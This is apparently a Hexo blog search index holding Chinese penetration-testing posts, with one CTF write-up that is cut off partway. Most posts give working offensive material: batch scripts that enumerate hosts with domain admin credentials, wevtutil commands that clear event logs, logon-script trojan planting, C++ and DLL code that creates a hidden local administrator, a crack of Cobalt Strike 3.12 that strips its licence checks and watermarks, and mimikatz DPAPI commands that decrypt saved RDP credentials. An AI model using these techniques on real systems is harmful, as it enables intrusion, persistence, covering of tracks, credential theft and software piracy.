<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【域渗透】获取域环境内用户登录信息]]></title>
    <url>%2F2018%2F11%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[之前见到有人在讨论域内用户在域内的机器ip怎么查呢，集思广益，结合答复及自己的观点，总结了以下内容。 0x00 adfind(未实践)有时候管理员会设置域用户只可以登录指定的的域内计算机，使用adfind或者powerview导出域用户信息可以查看；123456查看域内用户详细信息：adfind.exe -h DNS_SERVER_IP -sc u:username(目标用户)查看域内所有用户详细信息：AdFind.exe -h DNS_SERVER_IP -sc u:*详见：http://www.joeware.net/freetools/tools/adfind/usage.htm powerview在域内执行就可以。 0x01 查看域内机器的用户目录文件夹确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：123456789for /f "delims=" %%i in (live.txt) DO ( net use \\%%i\C$ password /u:domain\domain_admins_user if not errorlevel 1 ( for /f "delims=" %%j in ('dir /od /b \\%%i\C$\users\') do ( echo %%i:%%j&gt;&gt; test.log ) net use \\%%i\C$ /del )) 域管不用建立连接就可以访问域内计算机资源（未实践），因此以域管权限运行时可以参考如下批处理：12345for /f "delims=" %%i in (live.txt) DO ( for /f "delims=" %%j in ('dir /od /b \\%%i\C$\users\') do ( echo %%i:%%j&gt;&gt; test.log )) 0x02 域控日志wevtutil为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用epl参数，直接重定向输出即可。wevtutil常用的场景是清理日志。1234wevtutil cl applicationwevtutil cl securitywevtutil cl systemwevtutil cl &quot;windows powershell&quot; 而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功） 使用wevtutil结合python wevtutil 1wevtutil qe security /q:"Event[System[(EventID=4624 or EventID=4768 or EventID=4776)]]" /f:text /rd:true /c:1 &gt; EvtLogon.dat 参数说明 1234567qe: 从日志或日志文件中查询事件；（默认xml格式显示）Security: 指定安全事件的日志；/q: 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；/f: 以text格式显示/rd: 指定读取事件的方向/c: 指定个数该命令其它参数参考wevtutil /? python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# -- coding:utf-8 --# Python v2.7.10import sysimport csvevt = 'EvtLogon.dat'fevt = open(evt,'r')try: # For Eliminate redundancies lastdate = 'lastdate' lasttask = 'lasttask' # 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开 with open('LogonStat.csv', 'wb') as csvfile: csv_write = csv.writer(csvfile) csv_write.writerow(["Task", "Date", "Account Name", "Account Domain", "Logon Address"]) for eachline in fevt: if eachline.find('Event[') &gt; -1: task = '' date = '' accname = '' logontype = '' logonaddr = '' skip = 0 elif eachline.find('Date:') &gt; -1: date = eachline[(eachline.find(':')+1):].strip() elif eachline.find('Task:') &gt; -1: task = eachline.split(':')[1].strip() if (date == lastdate) and (task == lasttask): ## reduce skip = 1 else: lastdate = date lasttask = task elif eachline.find('Account Name:') &gt; -1: accname = eachline.split(':')[1].strip() if (task == 'Logon') and (accname.find('$') &gt; -1): ## reduce skip = 1 elif eachline.find('Account Domain:') &gt; -1: accdomain = eachline.split(':')[1].strip() elif eachline.find('Source Network Address:') &gt; -1: logonaddr = eachline[(eachline.find(':')+1):].strip() if logonaddr == '-': skip = 1 if (skip == 0) and (task == 'Logon'): LogonStat = [[task, date, accname, accdomain, logonaddr]] csv_write.writerows(LogonStat)except Exception as e: # pass print 'Error: %s' % e sys.exit(1)fevt.close()csvfile.close() PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。123wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='10'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &amp;lt;= 2592000000]]]"wevtutil qe Security /q:"*[System[(Keywords='0x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /rd:true /c:2 0x03 【参考】wevtutil筛选windows日志查询结果[Tools]获取域环境内所有用户登录信息（附源码及程序）域内用户在域内的机器ip怎么查呢？https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本]]></title>
    <url>%2F2018%2F11%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[摘要：采取直接的手段不能够解决问题，只好曲线救国。声明：只是作为搬运工。 0x00 利用场景 利用前置条件 1域管理员权限 使用场合 12知道目标域用户名称，探测不到域用户对应机器名或IP；知道目标机器IP，但是无法通往上控； 0x01 利用方法PS：以下测试全部在域控上执行 一）使用dsmod给指定域用户设置登陆脚本test.bat放在域控的NETLOGON目录下面12copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.batdsmod user -loscr &quot;test.bat&quot; &quot;CN=x,OU=x,DC=x,DC=x,DC=x&quot; 测试结果：PS: 测试机为Win-XP x86，第二次注销重新登陆bat脚本才执行，bat内容为`@calc.exe`。 二）登陆脚本给指定用户种马logon.bat放在域控的NETLOGON目录下面123copy logon.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.batnet user xp /scriptpath:logon.bat # 内网域成员机器可以使用gpupdate /force # 立即刷新组策略 使用域管权限执行 不执行也行,等待随机 测试结果与第一种方法一致 三）使用PowerShell的Active Directory模块ActiveDirectory.psd1项目：ADModule命令：12Import-Module ActiveDirectory.psd1; 或者Import-Module Microsoft.ActiveDirectory.Management.dllSet-ADUser -Identity AD_USER -ProfilePath &quot;filepath&quot; -ScriptPath &quot;filename&quot; 参数说明 Identity通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为： 1234一个名字GUID（objectGUID）安全标识符（objectSid）SAM帐户名称（sAMAccountName） ProfilePath指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。 ScriptPath指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。 测试结果与第一种方法一致 0x02 参考https://www.t00ls.net/thread-48540-1-1.htmlhttps://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.htmlhttps://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【C++】创建用户，并添加至管理组]]></title>
    <url>%2F2018%2F11%2F%E3%80%90C-%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84%2F</url>
    <content type="text"><![CDATA[摘要: 因有些需求，需要本地/远程添加用户。所以直接选择Windows API函数进行编写，因为部分杀软限制了CMD。123456程序名称：添加系统用户.exe(也可创建dll)编译平台：VS2015 C# (.NET Framework v4.0)、Windows 7 Ultimate x64编写语言：C++ (C#存在版本限制)测试条件：以管理员运行测试工具：zzz_exploit or other测试平台：xp-x64、win2003-x86、win7-x64、win2008-x64、win10-x64(火绒) --&gt;均可成功添加 0x00 思路及原理一）编程思路使用NetUserAdd函数添加普通权限的用户并指定级别。123456NET_API_STATUS NET_API_FUNCTION NetUserAdd( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。 LPDWORD parm_err); 使用NetLocalGroupAddMembers函数将现有用户账号添加到现有本地组。1234567NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 LPCWSTR groupname, // 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。 DWORD totalentries // 指定buf参数指向的缓冲区中的条目数。); 二）编写思路 定义USER_INFO_1 结构体该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。 调用NetUserAdd添加普通权限账户 调用NetLocalGroupAddMembers添加到管理员组 0x01 代码一）exe生成123456789101112131415161718192021222324252627282930313233343536373839// UserInfoAdd.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,"netapi32")#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[])&#123; // 定义USER_INFO_1结构体 USER_INFO_1 UserInfo; DWORD dwLevel = 1; DWORD dwError = 0; UserInfo.usri1_name = L"Admins"; // 账户 UserInfo.usri1_password = L"P@ssword233"; // 密码 UserInfo.usri1_priv = USER_PRIV_USER; UserInfo.usri1_home_dir = NULL; UserInfo.usri1_comment = NULL; UserInfo.usri1_flags = UF_SCRIPT; UserInfo.usri1_script_path = NULL; //添加名为Admins的用户,密码为P@ssword233 NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError); // 添加用户到administrators组 LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname = UserInfo.usri1_name; NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&amp;account, 1); return 0;&#125; 二）dll生成1234567891011121314151617181920212223242526272829#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,&quot;netapi32&quot;)#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt; #include &lt;iostream&gt;#include &lt;lm.h&gt;#include &lt;stdlib.h&gt;#include &lt;atlimage.h&gt;int NetUserAdd()&#123; ....&#125;BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123; switch (dwReason) &#123; case DLL_PROCESS_ATTACH: NetUserAdd(); break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 在编译代码的时候，选择MT，所有的依赖文件都会编进去。 0x02 备注123456支持最低客户端: Windows 2000 Professional [仅desktop apps]支持最低服务器: Windows 2000 Server [仅desktop apps]目标平台: WindowsHeader: lmaccess.h (include Lm.h)Library: Netapi32.libDLL: Netapi32.dll]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike 3.12 破解]]></title>
    <url>%2F2018%2F10%2FCobaltStrike-3-12-%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[听说有更新，所以就拿来看看，按照3.8的破解流程。 0x00 Cobalt Strike3.12 下载原版：https://github.com/microidz/Cobaltstrike-Trial 校验：https://verify.cobaltstrike.com/ xor.bin：https://github.com/verctor/CS_xor64 破解记录 0x01 文件文件位置1234567common/License.class # 修改时间及提示框common/ArtifactUtils.class # 去除后门特征指纹server/ProfileEdits.class # 去除后门特征指纹aggressor/dialogs/ListenerDialog.class # 去除listener个数限制aggressor/AggressorClient.class # 标题栏修改resources/xor.bin # 放入xor.bin文件resources/xor64.bin # 放入xor.bin文件 0x02 License.class首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行jad.exe License.class，jad目录下就会生成License.jad，修改后缀为Java，即是源码文件了。 这里将提供两种破解思路。 (1) 直接修改试用时间 123private static long life = 21L;将21天的试用期修改成private static long life = 99999L; (2) 修改isTrail的判断逻辑 123456789 public static boolean isTrial() &#123; return true; &#125;修改成 public static boolean isTrial() &#123; return false; &#125; 往下：12345678910public static void checkLicenseGUI(Authorization auth)&#123; ....&#125;修改成public static void checkLicenseGUI(Authorization authorization)&#123;&#125;同理public static void checkLicenseConsole(Authorization authorization) 0x03 去除listener个数限制文件在aggressor/dialogs/ListenerDialog.class 去除1234if(Listener.isEgressBeacon(payload) &amp;&amp; DataUtils.isBeaconDefined(datal) &amp;&amp; !name.equals(DataUtils.getEgressBeaconListener(datal))) &#123; DialogUtils.showError("You may only define one egress Beacon per team server.\nThere are a few things I need to sort before you can\nput multiple Beacon HTTP/DNS listeners on one server.\nSpin up a new team server and add your listener there."); &#125; else 0x04 后门特征指纹存在后门特征指纹的其中两个地方 common/ArtifactUtils.class1packer.addString("X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"); server/ProfileEdits.class12345c2profile.addCommand(".http-get.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".http-post.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".http-stager.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".stage.transform-x86", "append", "X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".stage.transform-x64", "append", "X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"); 0x05 结果最后使用1javac -classpath cobaltstrike.jar xxxx.java 进行编译 0x06 参考https://xz.aliyun.com/t/2170https://www.cnblogs.com/ssooking/p/9825917.htmlhttps://www.bilibili.com/video/av34171888/https://github.com/Lz1y/cobalt_strike_3.12_patch]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】批量Net-User]]></title>
    <url>%2F2018%2F08%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91-%E6%89%B9%E9%87%8FNet-User%2F</url>
    <content type="text"><![CDATA[域内批量执行net user Uname /domain 0x00使用场景在渗透测试中，需要查找域内某用户的机器所在，必须得确定目标人物所对应的域用户。查找域用户对应的Full Name信息，从而确认目标任务对应的域用户。 0x01 代码代码其实很简单，使用C#进行编写，可自行编译。 将所有域用户导入user.txt中（每个域用户一行），遍历文件中的用户，然后调用系统cmd命令执行net user Uname /domain，将运行结果进行输出，可根据自己需求进行二次修改（线程、正则、输出保存）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182using System;using System.IO;using System.Text;using System.Text.RegularExpressions;namespace domain&#123; class Program &#123; static void Main(string[] args) &#123; Console.WriteLine(&quot;Tools By RcoIl \r&quot;); string currentDirectory = Environment.CurrentDirectory; string text = currentDirectory + &quot;\\user.txt&quot;; // 文件绝对路径 if (!File.Exists(text)) &#123; Console.WriteLine(&quot;File not found &quot; + text); &#125; else &#123; FileStream stream = new FileStream(text, FileMode.Open, FileAccess.Read); // 打开文本 try &#123; StreamReader streamReader = new StreamReader(stream, Encoding.Default); // 实例化 try &#123; while (!streamReader.EndOfStream) // 读取文本 &#123; string text2; if ((text2 = streamReader.ReadLine()) != null &amp;&amp; text2.Length != 0) &#123; string id = text2; Program.Check(id); &#125; &#125; &#125; finally &#123; if (streamReader != null) &#123; ((IDisposable)streamReader).Dispose(); &#125; &#125; &#125; finally &#123; if (stream != null) &#123; ((IDisposable)stream).Dispose(); &#125; &#125; Console.WriteLine(&quot;============================================================&quot;); Console.WriteLine(&quot;Finish!&quot;); GC.Collect(); &#125; &#125; public static void Check(string id) &#123; System.Diagnostics.ProcessStartInfo proccessStartInfo = new System.Diagnostics.ProcessStartInfo(&quot;net&quot;, &quot;user &quot; + id + &quot; /domain&quot;); proccessStartInfo.CreateNoWindow = true; System.Diagnostics.Process proc = new System.Diagnostics.Process &#123; StartInfo = proccessStartInfo &#125;; proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息 proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动 proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口 proc.Start(); // 启动程序 string outlist = proc.StandardOutput.ReadToEnd(); // 获取cmd窗口的输出信息 Regex reg = new Regex(&quot;.*ame.*&quot;); MatchCollection result = reg.Matches(outlist); Console.WriteLine(&quot;============================================================&quot;); foreach (Match match in result) &#123; Console.WriteLine(match); &#125; proc.WaitForExit(); // 等待程序执行完退出进程 proc.Close(); &#125; &#125;&#125; 运行效果图： 0x02 总结在域内使用dsquery查找的信息是有限的，所以需要相应的辅助工具，这个工具存在的意义就是人物与域用户之间的确认。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>C#</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于windows的RDP连接记录]]></title>
    <url>%2F2018%2F05%2F%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。 0x00 前言每次成功连接到远程主机时，RDP客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动mstsc.exe时，可以直接从列表中选择远程RDP服务器的名称，并且客户端已自动填写用于登陆的用户名。 从安全角度来讲，这是极不安全的。 0x01 获取RDP连接历史记录至于获得历史记录的思路及细节实现思路，请转至三好学生师傅的博客，此处仅作为记录。 1234567891011121314151617181920212223242526272829303132333435363738&lt;#.SYNOPSISThis script will list the logged-in users&apos; RDP Connections History.Author: 3gstudent@3gstudentLicense: BSD 3-Clause#&gt;$AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser)&#123; $RegPath = &quot;Registry::HKEY_USERS\&quot;+$User.SID+&quot;\Software\Microsoft\Terminal Server Client\Servers\&quot; Write-Host &quot;User:&quot;$User.Name Write-Host &quot;SID:&quot;$User.SID Write-Host &quot;Status:&quot;$User.Status Try &#123; $QueryPath = dir $RegPath -Name -ErrorAction Stop &#125; Catch &#123; Write-Host &quot;No RDP Connections History&quot; Write-Host &quot;----------------------------------&quot; continue &#125; foreach($Name in $QueryPath) &#123; Try &#123; $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host &quot;User:&quot;$User Write-Host &quot;Server:&quot;$Name &#125; Catch &#123; Write-Host &quot;No RDP Connections History&quot; &#125; &#125; Write-Host &quot;----------------------------------&quot; &#125; 0x02 破解RDP连接凭证破解RDP连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。 1、查找本地的Credentials1dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* 2、使用mimikatz进行操作1mimikatz dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 得到的内容为： 123456789101112131415161718192021222324mimikatz # dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6**BLOB** dwVersion : 00000001 - 1 guidProvider : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125; dwMasterKeyVersion : 00000001 - 1 guidMasterKey : &#123;ffc994a1-de8d-4304-9416-31e587f7a8ca&#125; dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530 dwDataLen : 000000b0 - 176 pbData : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a dwSignLen : 00000040 - 64 pbSign : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8 接下来需要使用的就是guidMasterKey、pbData数据。pbData是凭据的加密数据，guidMasterKey是凭据的GUID 3、使用sekurlsa::dpapi 根据目标凭据GUID: {ffc994a1-de8d-4304-9416-31e587f7a8ca}找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。 4、解密命令为： 1dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c 0x03 清除RDP连接历史记录清除就相对简单一些。 1HKCU:\Software\Microsoft\Terminal Server Client\ 针对上述的Default、Server，对其表项进行删除 tips：由于在删除Server表项的时候无法一次选择所有表项，因为可以直接删除整个Server再新建。 除了删除注册表之外，要需要删除默认的RDP连接文件 1234567@echo offreg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f # 删除Default中的所有值reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /f # 删除整个Serversreg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; 重新创建删除的注册表项cd %userprofile%\documents\ # 转到Default.rdp文件目录attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏del Default.rdp # 删除文件Default.rdp文件 注意：在某些情况（比如系统盘空间不足）下，Document文件夹会从%userprofile%\documents\移动，所以特殊情况下，需要手动查找Default.rdp 0x04参考获得Windows系统的远程桌面连接历史记录 mimikatz获取本地Credentials 破解远程终端凭据，获取服务器密码 How to Clear RDP Connections History in Windows]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全,内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC-2018]]></title>
    <url>%2F2018%2F05%2FISCC-2018%2F</url>
    <content type="text"><![CDATA[又一年，不过今年的质量有些….. 0x01MiscWhat is that？附件地址：What is that 查看图片信息，使用传统的方法解答没见效，使用TweakPNG查看图片信息。 将高度调整即可得到flag。 秘密电报查看附件，内容为： 12秘密电报：知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA 老司机一看就是培根密码了，flag为：ILIKEISCC Where is the FLAG？附件地址：Where is the FLAG 题目：不只是Logo 查看详细信息，发现是由Adobe Fireworks CS5保存出来的图片，那就用Adobe Fireworks CS5打开。 调整画布大小，开始摆，得出一张二维码。flag{a332b700-3621-11e7-a53b-6807154a58cf} 一只猫的心思附件地址：一只猫的心思 题目：你能读懂它的心思吗？ 使用foremost抽离图片，得到一个doc文件，打开，内容为： 1名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通 到与佛论禅进行解密，得到一串16进制字符串，接下来： 116进制--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本 得到F1a9_is_I5cc_ZOl8_G3TP01NT 暴力XX不可取附件地址：暴力XX不可取 题目：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？ 下载附件直接能解压，flag.txt的内容为vfppjrnerpbzvat，凯撒解密得出flag为：isccwearecoming 重重谍影题目：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。 1Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9X